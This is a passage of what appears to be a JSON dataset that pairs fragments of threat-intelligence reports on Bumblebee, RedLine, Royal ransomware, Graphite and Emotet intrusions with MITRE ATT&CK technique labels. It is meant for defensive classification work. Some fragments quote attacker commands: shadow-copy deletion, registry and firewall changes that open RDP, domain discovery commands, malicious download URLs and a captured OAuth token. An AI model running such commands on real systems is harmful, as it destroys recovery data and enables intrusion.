    "text": "| Tee-Object ShareFinder.txt Because rundll32.exe executed PowerShell, we can see that rundll32.exe created the ShareFinder.txt output file in C:\\ProgramData\\. Seatbelt The tool SeatBelt was used by the threat actors on a server in order to discover potential security misconfigurations. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Option/Command Details (from the code) ‘v’ or “Vulnerability” “Search for available vulnerabilities for using LPE tools””Scans the operating system for vulnerabilities and displays a list of tools for a LPE” ‘m’ or “MicrosoftUpdates” “List of all installed microsoft updates””Displays a list installed Microsoft updates” ‘h’ or “HotFixes” “List of installed hot fixes””Displays a list of installed hot fixes” ‘s’ or “SupportedCve” “List of implemented tools for LPE “”Displays list of implemented CVE for LPE” ‘i’ or “SystemInfo” “Display information about current Windows version “ Below is the list of all of the currently supported (or implemented) CVE enumeration via installed KBs mapping: Threat actors executed this tool on patient 0 with low-level privileges multiple times, and again on a server with Administrator privileges.",
    "command": "",
    "labels": [
      "T1078",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Below are all the command lines run by the adversaries: Lateral Movement Lateral Tool Transfer Using the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the beachhead to a server: The threat actors also transferred ProcDump from the beachhead to multiple workstations: Remote Services Remote Desktop Protocol Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server: Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account: This first lateral movement was performed in order to drop and install AnyDesk. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "SMB/Windows Admin Shares Remote Service over RPC Multiple RPC connections were initiated from the rundll32.exe process where wab.exe previously injected into: These RPC connections targeted multiple hosts, including workstations, servers, and DCs. ",
    "command": "",
    "labels": [
      "T1055",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "As we can see with one server, which was targeted, the win32 function CreateServiceA was used by the malware in order to create a remote service over RPC on the server. ",
    "command": "",
    "labels": [
      "T1106",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "On each usage of this feature, a remote service was created with random alphanumeric characters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Below is an example of the service edc603a that was created on a Domain Controller: ",
    "command": "",
    "labels": [
      "T1078",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The random (PsExec) service runs a rundll32.exe process without any arguments.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "We observed this beacon performing various techniques (Process injections in svchost process via CreateRemoteThread, Default named pipes, etc.) Command and Control The graph below shows all communications to malicious IP addresses made by the dropped payloads or processes which threat actors injected into: BumbleBee 142.91.3[.]109 45.140.146[.]30 All the active Bumblebee command and control shared a common server configuration in regards to TLS setup. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Pty Ltd Subject Org: Internet Widgits Pty Ltd Public Algorithm: rsaEncryption Cobalt Strike Cobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as the main Command and Control tool, dropped several payloads, and injected into multiple processes on different hosts. ",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AnyDesk As mentioned before in the lateral tool transfer section, threat actors remotely dropped AnyDesk binary on a server from the beachhead: A new service was created (Event ID 7045) upon the execution of AnyDesk installer: ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "%AppData%\\AnyDesk\\ad.trace, show that it was used during Day 1 and Day 7 of this intrusion, using the Administrator account each time.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This threat actor employs tactics such as LOLBaS (Living Off the Land Binaries and Scripts), along with CMD-based scripts to carry out its malicious activities. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In this case, the threat actor behind the campaign used CMD-based scripts, AutoIt scripts, and LOLBaS. LOLBaS and CMD-based scripts help threat actors avoid detection by traditional security measures.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "By utilizing these techniques, they can gain unauthorized access to victims' systems, extract sensitive information, and ultimately compromise online banking accounts and payment systems. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Their selection of countries is likely influenced by the prevalence of online banking usage in these regions, making them lucrative targets for financial fraud. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The first .CMD file set seen to use AutoIt in its execution was discovered at the end of 2021.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 2 – Phishing email contents The email text employs scare tactics, such as evidence of a traffic violation, prompting the user to open the HTML attachment which contains some junk code and data in HEX format. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The purpose of the AutoIt script is to enumerate the host and download a “.VBS” file which then gets executed via the “SHELLEXECUTE”.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Next, it invokes the “_OUTRECOVERY()” function to steal Outlook data such as server, user, and password from POP3, SMPT, and IMAP registry keys. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "It proceeds by downloading the “sqlite3.dll” file from “hxxps[:]//www[.]autoitscript[.]com/autoit3/pkgmgr/sqlite/” which will be required later during the Chrome password theft. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "All data is then sent back to the attacker's C2 via the HTTP POST method.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The C2 is constructed with the victim's enumerated data, where the values are: v1 – OS language (e.g., 1033 – English US) v2 – keyboard layout (e.g., 1033 – English US) v3 – operating system version (Windows 7,8,10,11 or unknown) v4 – is target an admin or user v5 – OS architecture (x86 or x64) ",
    "command": "",
    "labels": [
      "T1005",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Technical DetailsATT&CK Profile CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks’ defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4 shows the code snippet of this RedLine component that will do the following: Escalate its privilege as administrator or trustedinstaller Try to disable Windows Defender service “WinDefend” Try to disable Tamper Protection settings of Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Try to Disable AntiSpyware, Real Time Protection and notification of Windows Defender. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disable Windows update services such as (“wuauserv”, “WaaSMedicSvc”, “UsoSvc”) ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Disable Automatic Update and change Windows configurations related to Windows Update Figure 4 RedLine Stealer Deep Dive C2 Connection Check RedLine Stealer is designed to be stealthy and avoid detection by security software.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 7 RedLine Capabilities RedLine Stealer has several features that will be executed depending on the configuration setting it downloaded from its C2 to steal information from the compromised or targeted host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Figure 8 Gather System Information As stated earlier, RedLine Stealer has the ability to collect or extract various types of system information from a targeted or compromised computer.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Function name (renamed) Description func_GetHostSerialNumber() Retrieve the user domain name, username and host serial number (without “-”) and convert it into a MD5 hash func_GetExecutingAssembly() Get the full file path of its running malware sample func_GetLanguageTimeZoneOsVersion() Retrieves system default language, timezone and OS version func_GetUserName() Get the user name of the compromised host func_GetProcessor() Get processor information of the compromised host by executing \"SELECT * FROM Win32_Processor\" func_GetGraphicCards() Get AdapterRAM and Graphic Card Name and type by executing \"root\\\\CIMV2\", \"SELECT *",
    "command": "",
    "labels": [
      "T1033",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FROM Win32_VideoController\" func_GetBrowsers() Parse browser application and browser version installed in the compromised host by querying \"SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet\" or \"SOFTWARE\\Clients\\StartMenuInternet\" registry func_GetTotalRAM() Get the total RAM size of compromised host by executing \"SELECT * FROM Win32_OperatingSystem\" and look for \"TotalVisibleMemorySize\" func_ListPrograms() Parse all installed application in the compromised host by querying 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall' registry func_GetFirewalls() Parse firewall and Anti Virus Product install in the compromised host by running \"SELECT * FROM ROOT\\\\SecurityCenter2\" \"SELECT * FROM ROOT\\\\SecurityCenter\" \"SELECT *",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FROM FirewallProduct\" \"SELECT * FROM AntiSpyWareProduct\" func_ListProcesses() Retrieve process list and process information by running 'SELECT *",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "FROM Win32_Process' func_AvailableLanguage() Get the install input language Screen Capture Based on one of the RedLine samples we analyzed, we saw that it has a functionality to capture a screenshot of the targeted or compromised host as part of its data collection and exfiltration.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RedLine uses .NET",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Graphics class CopyFromScreen",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Function() to transfer a bit block of color data from the screen to the Graphic drawing surface that will be saved in memory stream for data exfiltration. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The master key is encoded with Base64 and encrypted using Windows CryptProtectData() API. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Figure 11 shows the RedLine Stealer code and how it enumerates several known Crypto Wallet directories and looks for files related to crypto currencies by looking for files having “wallet” substring on its file name. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Royal ransomware’s attack flow Installation Our investigation found that the ransomware actors used a compiled remote desktop malware, which was used to drop the tools they needed to infiltrate the victim’s system: they used QakBot and Cobalt Strike for lateral movement, while NetScan was used to look for any remote systems connected to the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once they infiltrated the system, the ransomware actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "We also observed an instance in which they used AdFind to look for active directories, then executed RDPEnable on the infected machine. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Checking if length of provided “-id” is 32 bytes It enumerates files and directories for encryption using FindFirstFileW, FindNextFileW, and FindClose APIs (Figure 5). ",
    "command": "",
    "labels": [
      "T1083",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6). ",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Looking for accessible local IPs then trying to connect to ADMIN$ and IPC$ It checks for the number of processors in the infected system and uses it as a base for the concurrent running threads for file encryption, as shown in Figure 7.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Checking the number of processors Royal ransomware inhibits system recovery by deleting shadow copies (Figure 8) through the following command: C:\\\\Windows\\\\System32\\\\vssadmin.exe delete shadows /all",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Encrypted files appended with the “.royal” extension For each directory it traverses, Royal ransomware drops a text file named “README.TXT” that contains the ransom note (Figure 16), as well as an advertisement for its “pentesting services” that the ransomware actors will allegedly provide once the ransom has been paid (Figure 17). ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The infection chain consists of several stages and involves sideloading DLLs along with a seven-day sleep cycle before the malware attempts to retrieve additional malicious artifacts from a now-removed GitHub repository for the Windows based infection.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These second-stage payloads are information stealers that attempt to obtain system information and the latest browsing history records, indicating this information may be used as a filtering mechanism to identify and discard some victims while maintaining unauthorized access to others.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Figure 5: Comparison of code in document vs. blog Once the payload is decoded, it is written to the hardcoded path “C:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll” and executed using ShellExecute with the following command line: ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 9: Decrypted and decompressed payload The loader configuration format is as follows: Field 1: Injection type: Current process (1) or in the new process (2) Field 2: Flag to wait for injection thread to terminate before terminating loader (injection type 1 only) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Field 3: Process to inject into (injection type 2 only) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Field 4: Process to inject into (injection type 2 only) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Hence, the payload will only be executed up to 8 times per day. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To launch the shellcode, the loader calls ZwCreateThreadEx to create a new suspended injection thread hidden from debuggers using the THREAD_CREATE_FLAGS_CREATE_SUSPENDED (0x01) and THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (0x4) thread creation flags.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It does this by redirecting calls to the Windows Sleep API to its own function that performs the following: 1. Suspends all threads in the current process ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Demon communicates with the C2 server specified in the configuration via HTTP or HTTPS POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Chrome/108.0.0.0 Safari/537.36 URIs:/wp-content/themes/pressa/js/avias.js /wp-content/themes/pressa/js/mobile_menu.js /wp-content/plugins/contact-form-7/includes/js/scripts.js /wp-content/themes/pressa/js/bootstrap.js /wp-content/themes/pressa/js/hovermenu.js /wp-content/themes/pressa/js/retina-1.1.0.js /wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js /wp-content/themes/pressa/js/custom-script.js /wp-includes/js/wp-emoji-release.min.js /maps-api-v3/api/js/52/1/intl/uk_ALL/util.js /wp-includes/js/wp-embed.min.js The major features of Demon include: Enumerate host and network info (users, groups, domains, shares, etc.) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Execute commands via Command Prompt Execute PowerShell commands Inject and execute DLLs, shellcode, .NET assemblies, Cobalt Strike BOF files Manipulate processes (list, create, search, kill, etc.) Manipulate files and directories (list, download, upload, view, delete, etc.) ",
    "command": "",
    "labels": [
      "T1055",
      "T1057",
      "T1059.003",
      "T1070.004",
      "T1083",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The lure document is a PowerPoint file that exploits a code execution technique, which is designed to be triggered when the user starts the presentation mode and moves the mouse.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The code execution runs a PowerShell script that downloads and executes a dropper from OneDrive.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The latter downloads a payload that extracts and injects in itself a new PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft Graph API and OneDrive for C&C communications. ",
    "command": "",
    "labels": [
      "T1055",
      "T1105",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Lure document content This PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed to be triggered when the user starts the presentation mode and moves the mouse.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The code that is executed is a PowerShell script shown below, which is run through the utility SyncAppvPublishingServer, and performs the download of a file from OneDrive with a JPEG extension (DSC0002.jpeg).",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell Script The full URL used to download the DLL is reported below: URL https[:]\\\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The execution triggers the setting of the following registry key with the value C:\\ProgramData\\lmapi2.dll to achieve persistence. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "REG KEY HKCU\\Software\\Classes\\CLSID\\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\\InProcServer32 and the execution of the downloaded DLL via the tool",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "rundll32.exe. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "If the mutex doesn’t already exists, the malware makes another request to OneDrive using the following URL: URL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKOFgL4CARScSn9UMhq3c5hSNOQsDOamYLmOfN61lUtQO10vxtn0I7QROJdOtQ42wDsaiACGR5ZrmYwt0SmZkphGWQpT2gOFrsUxjg8_7QT01VTABiGr3T6xpWrTmFT5yu4toQ/DSC0001.jpeg?download\" A new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from WinCrypt APIs, with a hardcoded public key.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and executes the decrypted content in the newly allocated memory region.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Similarly, the imported code dynamically calls VirtualAlloc to allocate a new region of memory in which a new PE file is copied.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, it passes the execution to the region of memory in which the copied PE is allocated, as evidence reported following: The code in the injected PE creates another mutex having the name 42Htb600y.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware communicates with the Command and Control (C&C) through the domain graph[.]Microsoft[.]com, i.e. abusing the Microsoft Graph service, which is the API Web RESTful that provides access to Microsoft Cloud service resources.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Hence, the analysis showed that the sample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "To obtain a new OAuth2 token to access the service, the endpoint login[.]microsoftonline[.]com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825-bc65-203842ff92bc), as evidence below: The following is the full HTTP request to make the first connection to the C&C. HTTP REQUEST POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "CLR 3.5.30729)Content-Type: application/x-www-form-urlencodedHost: login.microsoftonline.comContent-Length: 459Connection: Keep-AliveCache-Control: no-cacheclient_id=62272a08-fe9d-4825-bc65-203842ff92bc&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=M.R3_BAY.-CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*ARh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SMIF!gXQ0sUli*gTjLrdaTxOnwndJcUIqtbY8D8ZCFI4lC3pEE3KW7ED!svw*kKb1rojgehD1Sa70lDuVa86awTeZrh8lyBh9m9vdudqoqVNLyRpLyHd*di1s2G6ub9MjH9BVoDVrDaqmJvUsMonxqqhqx!iwwU1ptzd1WngCv9BCmVtxgFTJBPR1bJ2Ze17e0N6W3VHZC2FQOOUhu4nQ2Wrj0qLEBowQ$$&grant_type=refresh_token Once obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child files in the check OneDrive subdirectory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1: Campaign execution stages ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The user is then prompted to open the single visible shortcut (2) file. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The only purpose of the script is to run the subsequent BAT scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Figure 3: UAC bypass implementation. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The BAT script (4) does several things: 1. Changes the password of the logged-in user. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "b. Register a new service that will run its VBS script (4.1) using sc.exe. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "5. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Researchers at ASERT have observed a new campaign targeting institutions in Romania and Russia utilizing spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Whilst the malware is not too sophisticated, it does have a broad range of commands that it can do, including keylogging every tap, exfiltrate data from messaging applications such as WhatsApp and Viber, and bypasses the Doze battery saver.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The malware can deliver payloads from the command and control (C2) server which originates from a free Russian web hosting service called Ucoz.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The emails have targeted corporate businesses using three possible types of messages to try to get a target to open the email and malicious attachment.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "If a target opens the malicious attachment, the Loki Bot malware then can assist in the threat actors gaining access to intellectual property, databases, bank account information, system credentials and more. ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The attachment, if opened, contains a DarkComet Remote Access Trojan (RAT).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike Execution The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Persistence The Emotet malware infection on the beachhead host used a registry run key to maintain persistence. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Defense Evasion Process injection was observed during the intrusion by both Emotet and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "-s LSM win_cobalt_strike_auto 9308 regsvr32.exe regsvr32 C:\\ProgramData\\1.dll win_cobalt_strike_auto 1056 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p win_cobalt_strike_auto 1428 svchost.exe C:\\Windows\\system32\\svchost.exe -k ICService -p win_cobalt_strike_auto 6036 regsvr32.exe regsvr32 C:\\ProgramData\\1.dll win_cobalt_strike_auto Credential Access From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Discovery On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "systeminfo ipconfig /all ",
    "command": "",
    "labels": [
      "T1016",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "net group \"Domain Computers\" /domain C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"Domain Admins\" C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "\"Enterprise Admins\" C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "systeminfo C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "net users C:\\Windows\\system32\\cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The batch file contained one line, which pinged a list of servers (servers.txt). ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "i -n 1 >> res.txt Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Command and Control Emotet In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "IcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Additional discovery commands were executed by Cobalt Strike. ",
    "command": "",
    "labels": [
      "T1033",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "cmd.exe /C",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "whoami /groupscmd.exe /C query sessioncmd.exe /C",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "In order to obtain SYSTEM level privileges, Cobalt Strike’s built-in named piped impersonation (GetSystem) was used: Image: “C:\\Windows\\System32\\cmd.exe” CommandLine: “C:\\Windows\\system32\\cmd.exe /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Image: C:\\Windows\\system32\\services.exe TargetObject: HKLM\\System\\CurrentControlSet\\Services\\d8d6deb\\ImagePath Details: \\\\HOSTNAME\\ADMIN$\\d8d6deb.exe After this initial activity, Cobalt Strike was used to enable RDP, and allow it through the firewall, on the domain controllers. ",
    "command": "",
    "labels": [
      "T1021.001",
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "0x0 /f cmd.exe /C netsh firewall set service type = remotedesktop mode = enable cmd.exe /C netsh firewall set rule group=\"remote desktop\" new enable=Yes cmd.exe /C netsh advfirewall set rule group=\"remote desktop\" new enable=Yes Following this, the threat actors then copied a Cobalt Strike Beacon DLL to the ADMIN$ share; and then, distributed it throughout the environment using PsExec. cmd.exe /C",
    "command": "",
    "labels": [
